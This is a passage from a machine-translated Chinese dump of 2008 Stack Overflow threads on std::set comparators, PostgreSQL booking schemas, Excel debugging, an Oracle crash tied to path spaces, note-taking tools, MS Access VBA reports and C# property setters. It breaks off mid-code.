我同意其他答案，这将以一些奇怪且难以调试的方式中断。如果你走刷新路线，你只需要复制一次。使用新的排序策略创建一个 tmp 集，将原始集合中的每个元素添加到 tmp 集中，然后执行

```
 orig.swap(tmp); 
```

这将交换集合的内部结构。

如果是我，我会将其封装在一个新类中，该类处理所有细节，以便您可以根据需要更改实现。根据您的访问模式和排序顺序更改的次数，前面提到的向量、排序、下限解决方案可能更可取。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-27T12:30:15.163

如果您可以使用无序集合，那么您为什么首先将它们添加到集合中？

我能想到的唯一情况是您只想在添加列表时确保列表是唯一的。如果是这种情况，那么您可以使用临时集来保护添加：

```
if (ts.insert (value).second) {
    // insertion took place
    realContainer.push_back (value);
} 
```

另一种选择是，根据您修改集合中条目的频率，您可能可以测试该条目是否位于不同的位置（通过使用集合比较功能）以及该位置将移动到哪里删除旧条目并重新添加新条目。

正如其他人所指出的那样——无序的集合真的很难闻——而且我也猜想它可能会根据标准得到*未定义的行为。*

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-27T13:07:52.887

虽然这并不能完全满足您的需求，但[boost::multi_index](http://www.boost.org/doc/libs/1_36_0/libs/multi_index/doc/index.html)为您提供了类似的功能。由于模板的工作方式，您将永远无法“更改”容器的排序谓词，它在编译时是一成不变的，除非您使用排序向量或类似的东西，*您*是维护者不变量，您可以在任何给定时间随意排序。

然而，Multi_index 为您提供了一种同时基于多个排序谓词对一组元素进行排序的方法。然后，您可以选择容器的视图，这些视图的行为类似于您当时关心的谓词排序的 std::set。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-27T11:36:34.083

这可能会导致条目丢失，当在排序运算符中搜索元素时，`set`这意味着如果一个元素被放置在根的左侧，而现在排序运算符说它在右侧，那么将不再找到该元素.

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-27T13:48:58.967

这是一个简单的测试：

```
struct comparer : public std::binary_function<int, int, bool>
{
  static enum CompareType {CT_LESS, CT_GREATER} CompareMode;
  bool operator()(int lhs, int rhs) const
  {
    if(CompareMode == CT_LESS)
    {
      return lhs < rhs;
    }
    else
    {
      return lhs > rhs;
    }
  }
};

comparer::CompareType comparer::CompareMode = comparer::CT_LESS;

typedef std::set<int, comparer> is_compare_t;

void check(const is_compare_t &is, int v)
{
  is_compare_t::const_iterator it = is.find(v);
  if(it != is.end())
  {
    std::cout << "HAS " << v << std::endl;
  }
  else
  {
    std::cout << "ERROR NO " << v << std::endl;
  }
}

int main()
{
  is_compare_t is;
  is.insert(20);
  is.insert(5);
  check(is, 5);
  comparer::CompareMode = comparer::CT_GREATER;
  check(is, 5);
  is.insert(27);
  check(is, 27);
  comparer::CompareMode = comparer::CT_LESS;
  check(is, 5);
  check(is, 27);
  return 0;
} 
```

因此，基本上，如果您打算能够*找到*曾经插入的元素，则不应更改用于插入和查找的谓词。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-31T09:53:35.290

只是一个跟进：

运行此代码时，Visual Studio C 调试库开始抛出异常，抱怨“<”运算符无效。

因此，更改排序顺序似乎是一件坏事。谢谢大家！

* * *

## 回答 #10

> 赞同：-3
> 
> 时间：2008-10-27T11:20:05.477

1) 有害 - 不。导致崩溃 - 不。最糟糕的确实是一个未排序的集合。

2）无论如何，“刷新”与重新添加相同！

# database - 在数据库中建模 1 对 1..n 关系

> ID：239601
> 
> 赞同：3
> 
> 时间：2008-10-27T11:25:34.200
> 
> 标签：database, postgresql

您将如何模拟预订的酒店房间与客人的关系（在 PostgreSQL 中，如果重要的话）？一个房间可以有几个客人，但至少有一个。

当然，可以使用外键将客人与预订联系起来`booking_id`。但是您如何在 DBMS 级别强制一个房间必须至少有一位客人？

可能只是不可能吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-27T11:43:03.183

实际上，如果您阅读该问题，它会说明已预订的酒店房间。这很容易做到，如下所示：

```
Rooms:
    room_id primary key not null
    blah
    blah

Guests:
    guest_id primary key not null
    yada
    yada

BookedRooms:
    room_id primary key foreign key (Rooms:room_id)
    primary_guest_id foreign key (Guests:guest_id)

OtherGuestsInRooms:
    room_id foreign key (BookedRooms:room_id)
    guest_id foreign key (Guests:guest_id) 
```

这样，您可以强制预订的房间至少有一位客人，而 OtherGuests 是 0 个或多个关系。您无法创建没有客人的预订房间，也无法添加没有预订房间的其他客人。

如果您想要一个 n 对 n 关系，这与您遵循的逻辑相同，应该将其规范化为一个单独的表，其中包含一个 1 对 n 和一个具有两个表的 n 对 1。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T11:33:40.020

在这种情况下，我建议您正在建模的实体实际上是一个**BOOKING** - 一个实体 - 而不是房间和客人的两个实体。

所以桌子会像

```
BOOKING
-------
booking id
room id
guest id (FK to table of guests for booking)
first date of occupancy
last date of occupancy 
```

客人 ID 不可为空，并且您有另一张桌子来容纳每次预订的客人......

```
GUESTS
------
guest id
customer id (FK to customer table) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-27T11:32:37.760

您可以将其中一位客人指定为“主要”客人，并将其映射到 Rooms 表上的一列。当然，这对于酒店来说是一个荒谬的规则，拥有 0 位客人的房间是完全有效的（我很可能支付一个房间而不呆在那里）......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-27T11:43:11.187

我想你的意思是房间预订至少是给一位客人的。ANSI 标准 SQL 将允许您将约束表示为 ASSERTION，例如：

```
create assertion x as check
   (not exists (select * from booking b
                where not exists
                   (select * from booking_guest bg
                    where bg.booking_id = b.booking_id))); 
```

但是，我不认为 Postgres 支持（我不确定当前的任何 DBMS 是否支持）。

有一种使用物化视图和检查约束的方法，但我在实践中从未见过这样做：

1）创建一个物化视图

```
select booking_id from booking b
where not exists 
   (select * from booking_guest bg 
    where bg.booking_id = b.booking_id); 
```

2）在物化视图中添加检查约束：

```
check (boooking_id is null) 
```

如果物化视图不为空，即如果有没有关联客人的预订，则此约束将失败。但是，您需要小心这种方法的性能。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T11:32:30.567

没有出租的房间怎么办？您正在寻找的是预订，并且预订可能需要至少一位客人。

我认为您要问的是您是否可以保证不添加预订记录，除非您至少有一位客人，并且您不能在没有预订的情况下添加客人。对于大多数 DBMS 系统来说，这有点像 Catch-22。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-09-15T09:17:02.483

我会说你应该创建一个`bookings`包含三个主键的表。`beds`但是，您可以参考一张桌子，而不是指预订房间。

```
bookings:
  bed_id: foreign_key primary
  guest_id: foreign_key primary
  day: date primary
  bill_id: foreign_key not null

beds:
  room_id: foreign_key primary 
```

由于`primary`这是必需的，并且由于这是客人和房间可以关联的唯一方式，因此可以确保没有客人就不能进行预订。

请注意，只有一个`day`字段。这要求您为客人入住房间的每一天创建一个预订，但还要确保不会意外预订两次。在任何一天只能由一位顾客预订一张床（这不适用于房间）

在`bill_id`那里，您可以将预订参考账单的特定记录，也可以通过其他事物（例如迷你吧费用）来参考。

# c# - 如何在调试时刷新 Excel

> ID：239609
> 
> 赞同：3
> 
> 时间：2008-10-27T11:28:53.460
> 
> 标签：c#, vb.net, visual-studio, excel, debugging

如果我正在调试（在这种情况下是由 Excel 调用的 Visual Studio 程序集）并且代码更新了 Excel 工作表，我如何让 Excel 在调试器中暂停时重绘当前工作表/窗口？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T17:53:04.963

如果您正在调用 Excel 跨进程（例如通过自动化），则 Excel 应在调用时自动显示任何更改，除非您设置`xlApp.ScreenUpdating = False`. `xlApp.ScreenUpdating = False`如果是这种情况，那么当您设置断点时，如果在调试模式下运行，您可能最好使用条件不设置。否则，您必须`xlApp.ScreenUpdating = True`从其他进程中进行设置（使用`GetObject()`或类似的东西，以便您可以获取相同的 Excel 应用程序实例）。

但是，如果您的代码在进程内被调用（例如，如果您的代码作为加载项运行），那么您的代码将通过热键组合、CommandBar 按钮、功能区控件回调等触发。在这种情况下，Excel 是单线程的，您的代码将停止所有 Excel 执行。在这种情况下，我唯一能想到的就是使用“编辑并继续”，添加该行`xlApp.ScreenUpdating = True`，然后进入下一行。（请记住，之后删除此行！）

如果您不使用`xlApp.ScreenUpdating = False`，那么我真的不知道您的问题是什么，您必须提供有关代码的更多详细信息...

# web-applications - 在部署能力方面，是否有任何 Web 编程语言脱颖而出或落后于其他语言？

> ID：239612
> 
> 赞同：0
> 
> 时间：2008-10-27T11:30:08.857
> 
> 标签：web-applications

就准备好接收使用该语言编写的应用程序的服务器数量而言，有多少人可以使用该语言编写代码，等等？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-27T11:38:01.617

现在不要笑，但我想说 PHP/MySQL 因其免费且非常容易在本地 Windows 或 linux 机器上运行而脱颖而出。大多数共享托管服务提供商都以可合理配置的状态提供这些服务。

*如果您需要一些有用的东西*，开始时不太难并且不花钱，那么您就不会出错。

将它与[Zend Framework](http://framework.zend.com)一起使用，以获得各种 OOP 优点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T11:34:15.557

与其说是语言，不如说是技术平台。IMO Sharepoint Web 应用程序在部署它们所需的管理操作方面还有很长的路要走，而直接的 ASP.NET 应用程序可以使用 WiX 脚本轻松安装（甚至在简单情况下也可以使用 XCOPY 部署...... )

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T12:34:27.773

使用 java 部署 web 应用程序非常简单。您只需将应用程序打包到一个war 文件（Web 存档）中，然后将该war 文件提供给将解包war 并自动部署它的应用服务器（tomcat、jboss、weblogic 等）。

他们也有很多可以编写java的程序员，所以这绝对不是问题。Java 语言还有大量的 Web 框架，包括基于 MVC（Spring MVC 可能是这里最著名的）和基于组件（JSF 实现）的。

另一个迅速崛起的 webapp 平台是 Seam，它很好地集成了完整的 JBOSS 堆栈（JBoss appserver、Hibernate、richfaces，...）

# xsd - XSD 根据先前的元素值更改可用元素

> ID：239615
> 
> 赞同：0
> 
> 时间：2008-10-27T11:31:41.270
> 
> 标签：xsd

有没有办法根据以前的元素值更改可用元素？

我有一些查找“原因”代码，但其中一些仅属于某些“产品”。

因此，我想创建每个产品查找原因代码枚举，并让它仅基于产品选择可用。

这可能吗 ？

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-11-07T00:22:54.903

我不认为那种“业务规则”可以用 XSD 来表达。

一种选择是还创建[schematron](http://www.schematron.com/)验证规则，以根据元素/属性值强制执行这些条件结构规则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-11-08T03:58:08.760

您可以在 XSD 中影响元素多态性（同名），例如使用枚举 xsi:type 属性修饰的元素，如此 [处所述](https://stackoverflow.com/questions/188389/xml-schema-for-elements-with-same-name-but-different-sub-structure-depending-on#233093)

# .net - 与 oracle 通信时应用程序崩溃，除非可执行路径包含空格

> ID：239622
> 
> 赞同：2
> 
> 时间：2008-10-27T11:37:35.970
> 
> 标签：.net, oracle, crash, directory

我们的 .NET 应用程序存在 x 文件问题。或者，更确切地说，混合 Win32 和 .NET 应用程序。

当它试图与 Oracle 通信时，它就死了。消失。向着天空中的黑色大虚空而去。没有事件日志消息，没有异常，没有任何东西。

如果我们只是要求应用程序与 MS SQL Server 对话，其效果是将 OracleConnection 和相关类的使用替换为 SqlConnection 和相关类，它会按预期工作。

今天我们取得了突破。

出于某种原因，一位客户发现通过将所有应用程序文件放在他桌面上的一个目录中，Oracle 也可以正常工作。将目录向下移动到驱动器的根目录，或者在 C:\Temp 或者，好吧，大约一点，使崩溃再次出现。

基本上，如果从桌面目录运行，应用程序可以 100% 重现，如果从根目录运行，应用程序会失败。

今天我们发现重要的区别在于目录名称中是否有空格。

因此，这些目录将起作用：

```
C:\Program Files\AppDir\Executable.exe
C:\Temp Lemp\AppDir\Executable.exe
C:\Documents and Settings\someuser\Desktop\AppDir\Executable.exe 
```

而这些不会：

```
C:\CompanyName\AppDir\Executable.exe
C:\Programfiler\AppDir\Executable.exe      <-- Program Files in norwegian
C:\Temp\AppDir\Executable.exe 
```

我希望读到这篇文章的人看到过类似的行为并且有“啊哈，你需要在 oracle glitz 驱动程序配置上调整 frob”或类似的东西。

任何人？

* * *

**跟进#1：**好的，我现在已经处理了 procmon 输出，这两个文件都是从我点击按钮尝试打开触发级联故障的窗口时开始的，我注意到它们大部分都在跟踪，有一些小的差异靠近两个文件的顶部，并且它们跟踪很长的路要走。

但是，当一个运行失败时，另一个会继续运行，日志输出的下几行如下：

```
ReadFile C:\oracle\product\10.2.0\db_1\BIN\orageneric10.dll    SUCCESS    Offset: 274 432, Length: 32 768, I/O Flags: Non-cached, Paging I/O, Synchronous Paging I/O
ReadFile C:\oracle\product\10.2.0\db_1\BIN\orageneric10.dll    SUCCESS    Offset: 233 472, Length: 32 768, I/O Flags: Non-cached, Paging I/O, Synchronous Paging I/O 
```

在此之后，工作运行继续执行，另一个在线程关闭和应用程序关闭之前触摸 mscorwks.dll 文件几次。因此，失败的运行不会触及上述文件。

* * *

**跟进#2：**我想我会尝试升级 oracle 客户端驱动程序，但 10.2.0.1 显然是 Windows 2003 服务器和 XP 客户端可用的最高版本。

* * *

**跟进#3：**嗯，我们最终得到了一个黑盒解决方案。基本上我们发现问题与[XPO](http://www.devexpress.com/Products/NET/ORM/)和 Oracle 有关。XPO 有一个它管理的系统表，称为 XPObjectType，它包含三列：Oid、TypeName 和 AssemblyName。由于 Oracle 在我们与之交谈的数据库中的配置方式，列名是 OID、TYPENAME 和 ASSEMBLYNAME。这通常不会成为问题，除了 XPO 直接与架构信息对话并检查表是否具有正确的列名，并且 XPO 不处理大小写差异，因此它会看到一个 XPObjectType 表，其中包含三个未知列并且没有它期望的那些。

XPO 现在究竟做了什么我真的不知道，但是如果我删除了这个表，并用正确的大小写重新创建它，在所有列名周围使用双引号来正确区分大小写，问题就不会出现。

文件夹名称中的空格到底是从哪里来的，我仍然不知道，但这个问题有两个层次：

1.  阻止应用程序在我们的客户处崩溃，短期解决方案
2.  修复bug，长期解决方案

现在第 1 层已解决，第 2 层将暂时放回队列并优先处理。无论如何，我们的数据层都面临着一些更大的变化，所以这可能不是我们需要解决的问题，至少如果我们所有的 Oracle 客户都验证表修复确实解决了问题的话。

我会接受[Dave Markle](https://stackoverflow.com/users/24995/dave-markle)的回答，因为尽管 Process Monitor（文件监视器的老大哥）实际上并没有查明问题，但我能够使用它来确定在 XPO 建立的用户代码中的断点之后对该表的查询，直到应用程序关闭的所有条目都被记录后才发生 I/O，这让我相信这张表是罪魁祸首，或者至少以某种方式影响了问题。

如果我设法找到真正的原因，我会更新帖子。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T11:54:28.637

这就是我要做的。首先，三重检查您是否看到了您认为您正在看到的行为。通过不使用 System.IO.Path 连接路径，我可以看到这种情况发生了相反的情况，但不像你看到的那样。三重检查文件权限是否有意义。

接下来，从 MS 下载[Filemon](http://technet.microsoft.com/en-us/sysinternals/bb896642.aspx)并观察在您的程序遇到这些问题时文件系统上发生的情况。您可以过滤掉特定的文件活动（例如，删除您的防病毒文件活动），以使您在执行此操作时看起来更干净。使用 FileMon 查找程序的成功案例和错误案例的文件访问错误。这应该指出您正在访问什么文件并导致问题。例如，如果您在`FILE_NOT_FOUND`访问无意义的文件名时看到错误，您可以确信您或供应商做错了什么，可能导致您的问题......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T14:07:36.540

您可能应该看看是否可以使用仅尝试打开与 Oracle 的连接的简单应用程序来重现该问题。这样，您可以 100% 确定问题出在 OracleConnection 或 Oracle 驱动程序上，而不是您自己的代码上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-09-18T00:39:22.380

您应该为此获得毅力奖章！

> “我真的不知道 XPO 现在到底做了什么，但如果我删除了这个表，并用正确的大小写重新创建它，在所有列名周围使用双引号来正确区分大小写，问题就不会出现。
> 
> 文件夹名称中的空格到底是从哪里来的，我还是不知道”

我在名称中使用空格时遇到的问题是，它们通常将空格前的位解释为名称，将其余位解释为参数。如果是这种情况，那么使用纯名称它可以看到“C\Temp”并且它是一个目录。使用带间隔的名称，它会获取“C:\Program Files”，查找“C:\Program”，但它不存在。例如，覆盖“C:\Temp”会失败，但会成功写入“C:\Program”。如果有一个名为“C:\Program”的文件或目录，想知道它是否仍然会因“C:\Program Files”而失败

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-05-04T20:13:24.297

我怀疑预言机客户端是诚实的。有一个令人沮丧的性质相似的问题。

如果我们安装在 64 位机器上，即使应用程序是 32 位，客户端在连接到 oracle 时也会在启动时停止。我们最终追查到某个 oracle 客户端（Ora 10 路径中的括号有问题，因此在程序文件下运行的程序将在程序文件（x86）下运行的程序导致崩溃。更新机器以使用 11G客户端解决了这个问题，但也有一些不能直接使用的补丁可以从metalink获得。在你的情况下，奇怪的是你没有例外，但是将应用程序移动到新文件夹的行为以类似的方式解决了这个问题，所以它可能是相关的。

ORA-12154: TNS: 无法解析指定的连接标识符或 ORA-6413: 连接未打开。

有用的链接[http://blogs.msdn.com/debarchan/archive/2009/02/04/good-old-connectivity-issue.aspx](http://blogs.msdn.com/debarchan/archive/2009/02/04/good-old-connectivity-issue.aspx)

下面来自 Metalink 的详细信息。

Metalink 错误 3807408 无法在用户名中使用引号对用户进行外部身份验证

说明 如果外部验证的用户名包含“(',')' 或 '='，则无法验证用户。此外，如果程序名称/路径包含这些字符，则可能无法连接。例如：安装在目录“C:\Program Files (x86)”中的 Windows 客户端无法与 ORA-12154 连接：TNS：无法解析指定的连接标识符

此问题的标志是网络跟踪（级别 16）显示问题字符替换为“？” 在跟踪。

解决方法 对于身份验证问题：更改用户名，或不对这些用户使用远程操作系统身份验证

对于程序/目录问题：更改程序/目录名称

# knowledge-management - 不会锁定您的记事工具

> ID：239626
> 
> 赞同：4
> 
> 时间：2008-10-27T11:38:47.980
> 
> 标签：knowledge-management

我们都知道，作为开发人员，拥有一个好的笔记工具很重要。

但是，OneNote 和 Evernote 迫使我们被锁定到特定的供应商。

任何人都知道好的开源工具，甚至是其他不被“锁定”的笔记方法吗？

编辑：我应该因为没有指定而把自己踢到头上。做文字笔记很容易。我希望能够写墨迹笔记（我使用平板电脑）、添加图像和草绘 GUI 创意。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-10-27T11:40:16.917

笔和纸。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-10-27T11:49:00.907

尝试一个文件[tiddlywiki](http://www.tiddlywiki.com/)，您甚至可以在这里获得共享主机[。](http://tiddlyspot.com/)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T11:40:52.813

使用文本编辑器并保存为文本文件。保证没有任何锁定。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-27T13:10:38.327

我使用的是开源[xournal 。](http://xournal.sourceforge.net/)它还允许您注释 PDF 文件，将它们用作背景，而不是更普通的空白、横线或网格。很像[美食家](http://www.adebenham.com/gournal/)

同一个空间里还有java应用：[jarnal](http://www.dklevine.com/general/software/tc1000/jarnal.htm)和[notelab](http://java-notelab.sourceforge.net/)

尝试在您的平台上运行的那些，看看您喜欢哪个。我不相信有人会做手写识别，这很遗憾，但它们似乎都非常有用。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-27T12:14:05.320

Evernote 不会强迫您被锁定。您可以将所有笔记导出为纯文本或 HTML。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-27T12:00:02.180

*   [http://www.vimoutliner.org/](http://www.vimoutliner.org/)
*   [http://www.vim.org/scripts/script.php?script_id=861](http://www.vim.org/scripts/script.php?script_id=861) (Vim 维基)
*   [http://skawina.eu.org/mikolaj/vst.html](http://skawina.eu.org/mikolaj/vst.html) (Vim ReStructuredText)

（或另一个带有 vim 的个人 Wiki 系统，只需 google 即可）。

纯文本一路...

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-27T12:46:41.870

[FreeMind](http://freemind.sourceforge.net/wiki/index.php/Main_Page)思维导图编辑器

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-27T11:45:06.593

如果您详细说明想要从笔记工具中获得哪些功能，这可能会有所帮助。

具有大纲模式的 Emacs 是一种选择。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-10-27T14:03:17.953

虽然它不完全是一个笔记工具，但我使用 OpenOffice 创建笔记并将它们保存在我的[Dropbox](http://www.getdropbox.com)文件夹中，以便在我登录的每台电脑上都可以使用它们。然后，它将这些笔记同步到您设置的每台 PC 上。

或者，您可以使用 Google 文档。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-27T16:10:09.337

我一直用记事本来做一些快速的事情。来自[微软](http://support.microsoft.com/kb/260563)：

> 要在记事本中创建日志文件：
> 1\. 单击开始，指向程序，指向附件，然后单击记事本。
> 2\. 在第一行键入 .LOG，然后按 ENTER 移动到下一行。
> 3\. 在“文件”菜单上，单击“另存为”，在“文件”>“名称”框中键入文件的描述性名称，然后单击“确定”。下次打开文件时，请注意日期和时间已附加到日志末尾，紧挨在可以添加新文本 > 的位置之前。您可以使用此功能自动将当前日期和时间添加到每个日志条目。

这很简单，但仅适用于 Windows > 2k。
您还应该查看[作为开发人员使用什么来记笔记](https://stackoverflow.com/questions/78756/what-do-you-use-to-keep-notes-as-a-developer)。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-27T20:21:47.643

笔和一个漂亮的[Moleskine 笔记本](http://www.moleskineus.com/moleskine-soft-large-ruled.html)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-10-27T12:00:34.410

记事本和/或 VI

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-27T12:12:40.597

好吧，我应该重新考虑 Evernote。因为它有一个公共 API，所以它不是一个有围墙的花园，我不介意“锁定到供应商”的东西 :) [Evernote API](http://evernote.com/about/developer/api/)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-10-27T12:17:50.927

再给 Vim 一票。

它是开源的，可用于多个平台并且没有锁定，因为文件可以通过其他文本编辑器访问（使用内置机制加密时除外，但这将是故意锁定）。

缺点：
它在易用性方面可能有一些小缺点，并且不能真正处理文本以外的文件类型。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2008-10-27T14:08:08.880

" [TodoPaper](http://widefido.com/products/todopaper/)是一个简单、轻量且易于使用的 Windows 待办事项列表应用程序。" 加上它基于纯txt文件。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-10-27T20:58:39.597

我通常混合使用一个电子表格程序（导出到 csv 以防被锁定）和一个纯文本编辑器，每个项目一个文件，或者一个包含更多注释的项目文件夹。我通常使用一张纸作为快速笔记，但总是在允许填写多张单面纸之前将所有笔记提交到磁盘。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2017-01-24T01:49:54.933

我基于 python 和 html 编辑器构建了一个，它对我来说很好用，你可以从 github 获取它：[MyNote](https://github.com/fiefdx/MyNote)，它看起来像： [![在此处输入图像描述](https://i.stack.imgur.com/N8o1n.png)](https://i.stack.imgur.com/N8o1n.png)

# ms-access - 访问：如何执行查询并将其结果保存在报告中

> ID：239628
> 
> 赞同：2
> 
> 时间：2008-10-27T11:39:32.067
> 
> 标签：ms-access

你好，

我正在尝试在 vba 中编写查询并将其结果保存在报告中。我是初学者。这是我尝试过的，有人可以纠正我吗

```
Dim cn As New ADODB.Connection, rs As New ADODB.Recordset
Dim sql As String

Set cn = CurrentProject.Connection
sql = "Select * from table1 where empno is 0"

rs.Open sql, cn

While Not rs.EOF

' here i think i should save the result in a report but i am not sure how

  rs.MoveNext
Wend
rs.Close
cn.Close
Set rs = Nothing
Set cn = Nothing 
```

另外我如何更改此查询以在数据库中的所有表上运行它

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T14:38:24.047

**如果您想使用 MS Access 的报告生成器创建报告**，则必须使用查询对象（可能有一种方法可以诱使 MS Access 从您的记录集中运行它，但这可能不值得您付出努力）。

您可以在“数据库”窗口中创建查询对象。单击对象列表中的查询按钮，然后单击新建。在生成的编辑器中，您可以以图形方式创建查询，或者如果您更喜欢使用 SQL。保存查询并给它一个有意义的全名。

同样，可以在“数据库”窗口中创建报告。单击报告按钮，然后单击新建。在生成的向导中，您将报告链接到您刚刚创建的查询。
***更新：****正如 DW Fenton 所说，您可以在报表对象中直接嵌入查询，而无需创建单独的查询对象。无论如何，我的偏好是创建一个。*

这种方法的问题是您必须为每个表创建单独的查询和报告。

**如果您只想将结果转储到文本文件（以便稍后读取/打印）**，那么您可以使用记录集来完成，就像您在 VBA 代码中一样。它看起来像这样

```
'...
dim strFoo as string
dim strBar as string
'...
if not rs.bof then
    rd.MoveFirst
end if
While Not rs.EOF
   strFoo = rs("foo") 'copy the value in the field 
                      'named "foo" into strFoo.
   strBar = rs("bar")
   '... etc. for all fields you want
   '
   'write out the values to a text file 
   '(I'll leave this an exercise for the reader)
   '
   rs.MoveNext
Wend
'... 
```

解析所有表可以在循环中完成，如下所示：

```
dim strTableName as string
dim db As Database
'...
Set db = CurrentDb
db.TableDefs.Refresh
For Each myTable In db.TableDefs
    If Len(myTable.Connect) > 0 Then
        strTableName = myTable.Name
        '...
        'Do something with the table
        '...
    End If
Next
set db = nothing 
```

**=======================更新=======================**
**有可能从记录集中运行 MS-Access 报告。**为了重复我对 来自[Access Web](http://www.mvps.org/access/reports/rpt0014.htm)[的 tksy 的问题](https://stackoverflow.com/questions/242504/accesshow-can-i-generate-a-report-of-a-recordset)所说的话，您可以使用记录集的“名称”属性。您生成的代码将如下所示：

*在报告中*

```
Private Sub Report_Open(Cancel As Integer)
    Me.RecordSource = gMyRecordSet.Name
End Sub 
```

*在调用对象（模块、表单等）中*

```
Public gMyRecordSet As Recordset
'...
Public Sub callMyReport()
    '...
    Set gMyRecordSet = CurrentDb.OpenRecordset("Select * " & _
                                               "from foo " & _
                                               "where bar='yaddah'")
    DoCmd.OpenReport "myReport", acViewPreview  
    '...
    gMyRecordSet.Close  
    Set gMyRecordSet = Nothing
    '...
End Sub 
```

**量子点**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T20:08:31.430

我不完全清楚你想做什么。如果要查看 SQL 语句的结果，可以创建一个表单并将其记录源设置为“Select * from table1 where empno is 0”。然后您可以一次查看一条记录的结果。

如果那不是您想要的，那么恐怕我没有足够的信息来回答您的问题。

从你*到目前为止*所说的，我看不出你需要 VBA 或报告的任何理由，因为你只是想查看数据。报表用于打印，表单用于查看和编辑。报表是面向页面的，不是那么容易导航，而表单是面向记录的，并且允许您编辑数据（如果您愿意）。

有关您想要完成的任务的更多信息将帮助我们为您提供更好的答案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T18:45:24.983

如果您只想查看结果，可以创建查询。例如，这里有一些粗略的、大部分未经测试的 VBA：

```
Sub ViewMySQL
Dim strSQL as String
Dim strName As String

'Note that this is not sensible in that you
'will end up with as many queries open as there are tables

    For Each tdf In CurrentDB.TableDefs
       If Left(tdf.Name,4)<>"Msys" Then
          strName = "tmp" & tdf.Name

          strSQL = "Select * from [" & tdf.Name & "] where empno = 0"
          UpdateQuery strName, strSQL
          DoCmd.OpenQuery strName, acViewNormal
       End If
    Next
End Sub

Function UpdateQuery(QueryName, SQL)

    If IsNull(DLookup("Name", "MsysObjects", "Name='" & QueryName & "'")) Then
        CurrentDb.CreateQueryDef QueryName, SQL
    Else
        CurrentDb.QueryDefs(QueryName).SQL = SQL
    End If

    UpdateQuery = True

End Function 
```

您可能还对 MDB Doc 感兴趣，它是 Microsoft Access 97-2003 的插件，允许您将 Access 数据库中的对象/属性记录到 HTML 文件中。

-- [http://mdbdoc.sourceforge.net/](http://mdbdoc.sourceforge.net/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T12:22:10.593

通常，您会根据数据源设计报告。然后在您的报告完成并正常工作后，您可以使用 VBA 显示或保存报告。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T12:28:42.777

要为数据库中的每个表运行它，我建议编写一个循环通过 CurrentData.AllTables(i) 的函数，然后在每次迭代中调用上面的函数

希望这可以帮助

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-08-10T05:27:14.913

有同样的问题。只需使用剪贴板！

1.  通过单击/拖动显示的所有字段名称来选择查询结果
2.  按 ctrl-c 复制到 Windows 剪贴板
3.  用word打开一个空白文档，然后在里面点击
4.  按 ctrl-v 从剪贴板粘贴。

# c# - 一种类型如何访问另一种类型属性的私有设置器？

> ID：239643
> 
> 赞同：1
> 
> 时间：2008-10-27T11:46:30.633
> 
> 标签：c#, access-modifiers

我所需要的只是一种使一个类的属性只能从另一个类（一种管理器类）“设置”的方法。

这在 C# 中甚至可能吗？

我的同事“可靠”地告诉我我有一个设计缺陷，但我觉得我至少应该在认输之前询问社区！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-27T11:48:28.070

不，在 C# 中不可能以任何干净的方式做到这一点。您可能有设计缺陷；-)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-27T11:54:15.827

您可以使用`internal`修饰符，它允许同一程序集中的所有类型访问数据（或指定程序集，如果使用`[InternalsVisibleTo]`- 但不是：C# 中没有`friend`等效项。

例如：

```
public string Foo {get; internal set;} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-27T11:55:52.300

你有一个设计缺陷。另外，不要对数据隐藏感到偏执。这是3.5的方法：

```
class Program
    {
        static void Main(string[] args)
        {
            Managed m = new Managed();
            Console.WriteLine(m.PrivateSetter);
            m.Mgr.SetProperty("lol");
            Console.WriteLine(m.PrivateSetter);
            Console.Read();
        }
    }

    public class Managed
    {
        private Manager _mgr;
        public Manager Mgr
        {
